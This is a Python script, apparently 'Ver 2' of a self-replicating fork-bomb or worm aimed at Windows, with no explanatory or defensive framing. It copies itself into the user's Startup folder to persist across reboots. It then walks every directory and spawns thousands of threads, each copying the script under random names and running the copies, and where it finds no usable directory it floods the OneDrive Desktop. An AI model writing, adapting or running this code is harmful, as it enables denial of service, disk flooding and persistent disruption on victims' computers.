import os
import random as r
from threading import *
import time
import shutil
import subprocess
import sys
import getpass
# Ver 2
NOTI = 5000
F_ex = '.py'
cmd = 'python'


def tags(): #Works
    tag = ''.join(str(r.randint(0, 9)) for _ in range(8))
    return tag


def create_1(dst, name): #Prior i did not add .py/.exe and the wrong file (.txt) was being searched for
    shutil.copy(__file__, f"{dst}/{name}{F_ex}")
    T = Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex))
    T.start()


def create_2(dst, name):
    shutil.copy(__file__, f"{dst}/{name}{F_ex}")
    T = Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex))
    T.start()


def create_file3(dst, name): # Diff name, should exc when dir not avaiable. (F)
    if dst == 'F':
        shutil.copy(__file__, f"{name}{F_ex}")
        T = Thread(target=ShutilExecute, args=(cmd, '', name, F_ex))
        T.start()


def create_file4(dst, name): # Diff name, should exc when dir not avaiable. (F)
    if dst == 'F':
        shutil.copy(__file__, f"{name}{F_ex}")
        T = Thread(target=ShutilExecute, args=(cmd, '', name, F_ex))
        T.start()


def add_to_startup():
    user = getpass.getuser()
    startup_folder = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    script_path = os.path.abspath(sys.argv[0])
    shutil.copy(script_path, startup_folder)




def file_run(dst, name):
    #Should use any extra time to run another file.
    #LINKED to one, so every stack gets its own extra.
    T = Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex))
    T.start()




def intilize():
    user = getpass.getuser()
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    if script_path.startswith(startup_folder):
        # Already in startup folder, do nothing
        pass
    else:
        # Add script to startup folder
        try:
            add_to_startup()
        except:
            time.sleep(0.5)




def search():
    Dir = []


    for root, dirs, files in os.walk("./", topdown=False):
        for name in files:
            Dir.append(os.path.join(root, name))
        for name in dirs:
            Dir.append(os.path.join(root, name))
    return Dir




def ShutilExecute(cmd, dst, name, exentension):
    subprocess.run([f'{cmd}', f"{dst}/{name}{exentension}"], shell=True)




def main(Dir):
    intilize()
    CUSTOMTAG = f"FILE{tags()}" #Tag for only num 1, allows threading for second file.


    for item in Dir:
        if os.path.isdir(item):
            if os.access(item, os.R_OK):
                print(f'\x1b[6;30;42m' + f'DIR {item} ACESSED!' + '\x1b[0m') #For testing purposes
                try:
                    for _ in range(NOTI):
                        C1 = Thread(target=create_1, args=(item, CUSTOMTAG))
                        F1 = Thread(target=file_run, args=(item, CUSTOMTAG))
                        C2 = Thread(target=create_2, args=(item, f"FILE{tags()}"))


                        C1.setDaemon(True)
                        F1.setDaemon(True)
                        C2.setDaemon(True)


                        C1.start()
                        F1.start()
                        C2.start()


                except:
                    for _ in range(NOTI):
                        C3 = Thread(target=create_file3, args=("F", f"FILE{tags()}"))
                        F1 = Thread(target=file_run, args=(item, CUSTOMTAG))
                        C4 = Thread(target=create_file4, args=("F", f"FILE{tags()}"))


                        C3.setDaemon(True)
                        F1.setDaemon(True)
                        C4.setDaemon(True)


                        C3.start()
                        F1.start()
                        C4.start()


            else:
                for _ in range(NOTI):


                    try:
                        C1 = Thread(target=create_1, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG)) #If no dir was found it will spam your desktop.
                        F1 = Thread(target=file_run, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG))


                        C1.setDaemon(True)
                        F1.setDaemon(True)
           
                        C1.start()
                        F1.start()


                    except:
                        C3 = Thread(target=create_file3, args=("F", f"FILE{tags()}"))
                        C4 = Thread(target=create_file4, args=("F", f"FILE{tags()}"))
                   
                        C3.setDaemon(True)
                        C4.setDaemon(True)


                        C3.start()
                        C4.start()
        else:
            C3 = Thread(target=create_file3, args=("F", f"FILE{tags()}"))
            C4 = Thread(target=create_file4, args=("F", f"FILE{tags()}"))
       
            C3.setDaemon(True)
            C4.setDaemon(True)


            C3.start()
            C4.start()


if __name__ == "__main__":
    main(search())



